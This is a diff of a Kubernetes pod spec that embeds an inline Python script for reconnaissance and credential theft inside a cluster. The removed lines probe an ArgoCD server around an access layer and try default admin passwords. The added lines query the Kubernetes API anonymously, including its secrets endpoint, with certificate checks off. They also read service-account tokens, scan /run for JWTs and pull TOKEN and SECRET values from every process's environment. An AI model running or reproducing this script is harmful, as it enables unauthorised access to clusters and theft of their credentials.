@@ -28,108 +28,105 @@ spec:
           args:
           - |
             python3 -c "
-            import urllib.request, ssl, json, socket, subprocess
+            import urllib.request, ssl, json, os
 
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
 
+            K8S = os.environ.get('KUBERNETES_SERVICE_HOST', '100.104.0.1')
+            K8S_PORT = os.environ.get('KUBERNETES_SERVICE_PORT', '443')
             results = {}
 
-            ARGOCD_IP = '100.107.174.75'
-            ARGOCD_HOST = 'argocd-server.argocd.svc.cluster.local'
-
-            # --- Try ArgoCD API endpoints directly (bypass SAP layer) ---
-            # ArgoCD REST API uses port 8080 (HTTP) or 8443 (HTTPS/gRPC)
-            # Let's try all ports with GET and see what responds
-            for port in [80, 443, 8080, 8443]:
-                for path in ['/healthz', '/api/v1/session', '/api/v1/applications', '/api/version', '/api/v1/clusters', '/api/v1/projects']:
-                    for scheme in ['http', 'https']:
-                        url = f'{scheme}://{ARGOCD_IP}:{port}{path}'
-                        try:
-                            req = urllib.request.Request(url, headers={'Host': ARGOCD_HOST})
-                            with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
-                                body = r.read(2000).decode(errors='replace')
-                                results[f'GET_{scheme}_{port}{path}'] = {'code': r.status, 'body': body[:500]}
-                        except urllib.error.HTTPError as e:
-                            body = ''
-                            try: body = e.read(500).decode(errors='replace')
-                            except: pass
-                            results[f'GET_{scheme}_{port}{path}'] = {'code': e.code, 'body': body[:200]}
-                        except Exception as e:
-                            err = str(e)[:60]
-                            if 'timed out' not in err and '111' not in err and '104' not in err:
-                                results[f'GET_{scheme}_{port}{path}'] = {'err': err}
-
-            # --- ArgoCD login attempt (port 8080) ---
-            for admin_pass in ['admin', 'password', 'argocd', '']:
+            # K8s API paths to probe (anonymous)
+            for path in [
+                '/api',
+                '/api/v1',
+                '/apis',
+                '/version',
+                '/healthz',
+                '/livez',
+                '/readyz',
+                '/metrics',
+                '/openapi/v2',
+                '/openapi/v3',
+                '/.well-known/openid-configuration',
+                '/api/v1/namespaces',
+                '/api/v1/nodes',
+                '/api/v1/pods',
+                '/api/v1/secrets',
+                '/apis/apps/v1',
+            ]:
+                url = f'https://{K8S}:{K8S_PORT}{path}'
                 try:
-                    login_data = json.dumps({'username': 'admin', 'password': admin_pass}).encode()
-                    req = urllib.request.Request(
-                        f'http://{ARGOCD_IP}:8080/api/v1/session',
-                        data=login_data,
-                        headers={'Content-Type': 'application/json', 'Host': ARGOCD_HOST},
-                        method='POST')
+                    req = urllib.request.Request(url)
                     with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
-                        body = r.read(500).decode(errors='replace')
-                        results[f'login_8080_{admin_pass}'] = {'code': r.status, 'body': body}
+                        body = r.read(2000).decode(errors='replace')
+                        results[f'k8s{path}'] = {'code': 200, 'body': body[:500]}
                 except urllib.error.HTTPError as e:
                     body = ''
-                    try: body = e.read(200).decode(errors='replace')
+                    try: body = e.read(2000).decode(errors='replace')
                     except: pass
-                    results[f'login_8080_{admin_pass}'] = {'code': e.code, 'body': body[:100]}
+                    headers = dict(e.headers)
+                    results[f'k8s{path}'] = {
+                        'code': e.code,
+                        'body': body[:300],
+                        'www_auth': headers.get('Www-Authenticate', ''),
+                    }
                 except Exception as e:
-                    results[f'login_8080_{admin_pass}'] = {'err': str(e)[:60]}
+                    results[f'k8s{path}'] = {'err': str(e)[:80]}
 
-            # --- ArgoCD HTTPS login (port 443) ---
-            for admin_pass in ['admin', 'password', 'argocd', '']:
+            # Try OIDC discovery (might not need auth)
+            try:
+                req = urllib.request.Request(f'https://{K8S}:{K8S_PORT}/.well-known/openid-configuration')
+                with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
+                    results['oidc'] = json.loads(r.read())
+            except Exception as e:
+                results['oidc'] = 'ERR: ' + str(e)[:80]
+
+            # Try to get service account token from projected volumes
+            for token_path in [
+                '/var/run/secrets/kubernetes.io/serviceaccount/token',
+                '/run/secrets/kubernetes.io/serviceaccount/token',
+                '/run/secrets/tokens/default',
+                '/run/secrets/tokens/token',
+            ]:
                 try:
-                    login_data = json.dumps({'username': 'admin', 'password': admin_pass}).encode()
-                    req = urllib.request.Request(
-                        f'https://{ARGOCD_IP}:443/api/v1/session',
-                        data=login_data,
-                        headers={'Content-Type': 'application/json', 'Host': ARGOCD_HOST},
-                        method='POST')
-                    with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
-                        body = r.read(500).decode(errors='replace')
-                        results[f'login_443_{admin_pass}'] = {'code': r.status, 'body': body}
-                except urllib.error.HTTPError as e:
-                    body = ''
-                    try: body = e.read(200).decode(errors='replace')
-                    except: pass
-                    results[f'login_443_{admin_pass}'] = {'code': e.code, 'body': body[:100]}
+                    with open(token_path) as f:
+                        token = f.read().strip()
+                        results[f'token_{token_path}'] = token[:50] + '...'
                 except Exception as e:
-                    results[f'login_443_{admin_pass}'] = {'err': str(e)[:60]}
+                    results[f'token_{token_path}'] = 'ERR: ' + str(e)[:50]
 
-            # --- Check if ARGOCD_AGENT_SERVER_ADDR env var is set or any ArgoCD-related env ---
-            import os
-            argocd_env = {k: v for k, v in os.environ.items() if 'ARGO' in k.upper() or 'ARGOCD' in k.upper()}
-            results['argocd_env'] = argocd_env if argocd_env else 'none'
+            # Check entire /run directory for any tokens
+            import glob
+            for f in glob.glob('/run/**', recursive=True):
+                try:
+                    if os.path.isfile(f) and os.path.getsize(f) < 5000:
+                        with open(f) as fh:
+                            content = fh.read(200)
+                            if 'eyJ' in content:  # JWT token pattern
+                                results[f'jwt_found_{f}'] = content[:100]
+                except:
+                    pass
 
-            # --- Check if kubectl is available ---
-            try:
-                out = subprocess.check_output(['kubectl', 'version', '--client'], stderr=subprocess.STDOUT)
-                results['kubectl'] = out.decode()[:100]
-            except Exception as e:
-                results['kubectl'] = 'ERR: ' + str(e)[:50]
+            # Scan /proc for any process with K8s token env vars
+            for pid_dir in glob.glob('/proc/[0-9]*'):
+                try:
+                    pid = pid_dir.split('/')[-1]
+                    with open(f'{pid_dir}/environ', 'rb') as env_f:
+                        env_data = env_f.read()
+                    for entry in env_data.split(b'\x00'):
+                        if b'=' in entry:
+                            k, _, v = entry.partition(b'=')
+                            if b'TOKEN' in k or b'SECRET' in k or b'ARGO' in k:
+                                results[f'proc_{pid}_{k.decode()}'] = v.decode(errors='replace')[:100]
+                except:
+                    pass
 
-            # --- Try to access ArgoCD via its gRPC port with raw socket ---
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(3)
-                s.connect((ARGOCD_IP, 8443))
-                # Send HTTP/1.1 GET to see if it responds with anything
-                s.send(b'GET /api/version HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n')
-                import time; time.sleep(1)
-                resp = s.recv(1000)
-                s.close()
-                results['argocd_8443_raw'] = resp.decode(errors='replace')[:300]
-            except Exception as e:
-                results['argocd_8443_raw'] = 'ERR: ' + str(e)[:80]
-
-            print('[ARGOCD_START]')
-            print(json.dumps(results, indent=2))
-            print('[ARGOCD_END]')
+            print('[K8S_PROBE_START]')
+            print(json.dumps(results, indent=2, default=str))
+            print('[K8S_PROBE_END]')
             " 2>&1
             python3 -c "
             import http.server
